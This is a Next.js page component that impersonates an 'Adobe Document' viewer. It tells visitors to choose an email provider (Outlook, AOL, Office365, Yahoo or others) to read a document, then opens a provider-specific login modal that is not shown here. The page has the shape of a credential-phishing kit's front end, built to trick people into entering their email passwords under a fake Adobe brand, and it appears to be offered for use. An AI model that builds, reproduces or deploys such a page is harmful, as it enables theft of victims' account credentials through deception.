'use client';

import { useState } from "react";
import LoginModal from "@/app/ui/login-modal";
import Image from "next/image";
import { motion } from "framer-motion";

const providers = [
  { name: "Outlook", color: "bg-blue-600" },
  { name: "AOL", color: "bg-[#3A3A3A]" },
  { name: "Office365", color: "bg-[#F25022]" },
  { name: "Yahoo", color: "bg-[#720E9E]" },
  { name: "Others", color: "bg-blue-500" },
];

export default function Home() {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [clickCount, setClickCount] = useState(0);

  return (
    <div className="relative flex items-center justify-center min-h-screen overflow-hidden">
      {/* Background Image */}
      <Image
        src="/background.png"
        alt="Background"
        layout="fill"
        objectFit="cover"
        className="blur-md opacity-40"
      /> 

      {/* Overlay */}
      <div className="absolute inset-0 bg-gradient-to-br from-black/20 to-white/30 backdrop-blur-sm z-10" />

      

      {/* Foreground Content */}
      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.8, ease: "easeOut" }}
        className="z-20 relative flex flex-col items-center space-y-4 text-center text-white px-4"
      >
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ delay: 0.3, duration: 0.5 }}
        >
          <Image src="/adobe.png" alt="Adobe" width={56} height={56} className="mx-auto mb-3" />

           <motion.h2
          className="text-3xl font-semibold tracking-wide text-black"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.6 }}
        >
          Adobe Document
        </motion.h2>
        </motion.div>

       

        <motion.p
          className="text-lg text-white/80 mb-5 max-w-md"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.5, duration: 0.5 }}
        >
          To read the document, please choose your email provider below.
        </motion.p>

        {/* Buttons */}
        <motion.div
          className="bg-white/10 text-white p-5 rounded-2xl w-80 shadow-lg space-y-3"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.6, duration: 0.6 }}
        >
          {providers.map(({ name, color }) => (
            <motion.button
              key={name}
              whileHover={{ scale: 1.03 }}
              whileTap={{ scale: 0.98 }}
              className={`w-full ${color} text-white font-medium py-2 rounded-xl transition-all duration-300`}
              onClick={() => {
                setSelectedProvider(name);
                setClickCount(0);
              }}
            >
              {name}
            </motion.button>
          ))}
        </motion.div>

        <p className="text-xs text-white/50 mt-4">
          &copy; 2026 Adobe Document.
        </p>
      </motion.div>

      {/* Modal */}
      {selectedProvider && (
        <LoginModal
          provider={selectedProvider}
          onClose={() => setSelectedProvider(null)}
          clickCount={clickCount}
          setClickCount={setClickCount}
        />
      )}
    </div>
  );
}
